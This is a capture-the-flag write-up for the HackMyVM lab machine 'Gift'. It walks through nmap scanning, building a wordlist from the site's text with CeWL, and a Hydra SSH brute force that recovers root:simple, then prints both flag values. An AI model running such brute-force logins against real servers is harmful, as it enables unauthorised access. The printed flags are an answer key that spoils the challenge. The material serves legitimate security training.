# Gift — HackMyVM Writeup
 
| Machine | Author | Level/Difficulty |
|---------|--------|-------------------|
| Gift | @sml | Easy |
 
Welcome to the **Gift** writeup! In this machine we cover the full hacking cycle:
 
- Reconnaissance
- Wordlist building with CEWL
- Brute-forcing SSH credentials with Hydra
- Direct root access via SSH
---
 
## 1. Reconnaissance
 
First we create a working directory for this machine:
 
```
┌──(r4v3x㉿kali)-[~/Desktop]
└─$ mkdir Gift
┌──(r4v3x㉿kali)-[~/Desktop]
└─$ cd Gift
```
 
We check for the target's IP address with `arp-scan`:
 
```
┌──(r4v3x㉿kali)-[~/Desktop/Gift]
└─$ sudo arp-scan -l | grep "PCS"
192.168.0.16    08:00:27:61:b3:53       PCS Systemtechnik GmbH
```
 
Once we have the IP, we confirm it's reachable:
 
```
┌──(r4v3x㉿kali)-[~/Desktop/Gift]
└─$ ping 192.168.0.16
PING 192.168.0.16 (192.168.0.16) 56(84) bytes of data.
64 bytes from 192.168.0.16: icmp_seq=1 ttl=64 time=1.01 ms
64 bytes from 192.168.0.16: icmp_seq=2 ttl=64 time=1.20 ms
64 bytes from 192.168.0.16: icmp_seq=3 ttl=64 time=1.59 ms
```
 
We save the IP as a variable for convenience, and also save it to a file called `notes`:
 
```
┌──(r4v3x㉿kali)-[~/Desktop/Gift]
└─$ ip=192.168.0.16
┌──(r4v3x㉿kali)-[~/Desktop/Gift]
└─$ sudo arp-scan -l | grep "PCS" | awk '{print $1}' > notes
┌──(r4v3x㉿kali)-[~/Desktop/Gift]
└─$ ls
notes
```
 
Now it's time to run an Nmap scan to see what's open on the target:
 
```
┌──(r4v3x㉿kali)-[~/Desktop/Gift]
└─$ sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn -vvv 192.168.0.16 -oN Gift_Results.txt
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-06 20:15 -0500
...
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 8.3 (protocol 2.0)
| ssh-hostkey:
|   3072 2c:1b:36:27:e5:4c:52:7b:3e:10:94:41:39:ef:b2:95 (RSA)
|   256 93:c1:1e:32:24:0e:34:d9:02:0e:ff:c3:9c:59:9b:dd (ECDSA)
|   256 81:ab:36:ec:b1:2b:5c:d2:86:55:12:0c:51:00:27:d7 (ED25519)
80/tcp open  http    syn-ack ttl 64 nginx
| http-methods:
|_  Supported Methods: GET HEAD
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:61:B3:53 (Oracle VirtualBox virtual NIC)
 
Nmap done: 1 IP address (1 host up) scanned in 156.14 seconds
Raw packets sent: 373674 (16.442MB) | Rcvd: 65544 (2.622MB)
```
 
We find two open ports: **22/TCP (SSH)** and **80/TCP (HTTP)**, running on an **nginx** server.
 
---
 
## 2. Enumeration
 
We can access the website from the browser to confirm there's something running, but we can also just use `curl`:
 
```
┌──(r4v3x㉿kali)-[~/Desktop/Gift]
└─$ curl -s $ip
 
Dont Overthink. Really, Its simple.
        <!-- Trust me -->
```
 
After trying some fuzzing without any luck, it looks like this page's own text is meant to be the hint — so the next move is a **brute-force attack** instead.
 
### Building a custom wordlist with CEWL
 
We create a wordlist from the words found on the page itself using **CEWL**:
 
```
┌──(r4v3x㉿kali)-[~/Desktop/Gift]
└─$ cewl --with-numbers $ip
CeWL 6.2.1 (More Fixes) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
Dont
Overthink
Really
Its
simple
Trust
```
 
We save that output into a wordlist file called `dicc`:
 
```
┌──(r4v3x㉿kali)-[~/Desktop/Gift]
└─$ cewl --with-numbers $ip -w dicc
CeWL 6.2.1 (More Fixes) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
```
 
Then, using `nano`, we add a few likely usernames to the same list (in this case `admin`, `user`, and `root`), so it can double as both a username and password list:
 
```
Dont
Overthink
Really
Its
simple
Trust
admin
user
root
```
 
---
 
## 3. Exploitation
 
Now it's time to brute-force SSH with **Hydra**, using the same wordlist for both usernames (`-L`) and passwords (`-P`):
 
```
┌──(r4v3x㉿kali)-[~/Desktop/Gift]
└─$ sudo hydra -t 64 -L dicc -P dicc ssh://192.168.0.16 -f -I
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak
 
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-11-06 21:04:53
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 81 login tries (l:9/p:9), ~2 tries per task
[DATA] attacking ssh://192.168.0.16:22/
[22][ssh] host: 192.168.0.16   login: root   password: simple
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-11-06 21:04:58
```
 
Bingo — **user: `root`, password: `simple`**.
 
### Logging in via SSH
 
We now log in directly as `root` over SSH:
 
```
┌──(r4v3x㉿kali)-[~/Desktop/Gift]
└─$ ssh root@192.168.0.16 -p22
The authenticity of host '192.168.0.16 (192.168.0.16)' can't be established.
ED25519 key fingerprint is: SHA256:dXsAE5SaInFUaPinoxhcuNloPhb2/x2JhoGVdcF8Y6I
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.0.16' (ED25519) to the list of known hosts.
root@192.168.0.16's password:
IM AN SSH SERVER
gift:~# whoami
root
gift:~#
```
 
We're in — and already as **root**, no privilege escalation needed.
 
---
 
## 4. Capturing the Flags
 
```
gift:~# ls
root.txt  user.txt
gift:~# cat user.txt
HMV665sXzDS
gift:~# cat root.txt
HMVtyr543FG
```
 
---
 
## 🏁 Flags
 
| Flag | Location | Value |
|------|----------|-------|
| User | `/root/user.txt` | `HMV665sXzDS` |
| Root | `/root/root.txt` | `HMVtyr543FG` |
 
---
 
*Machine rooted — full cycle complete: recon → wordlist building → credential brute force → direct root access.*
 

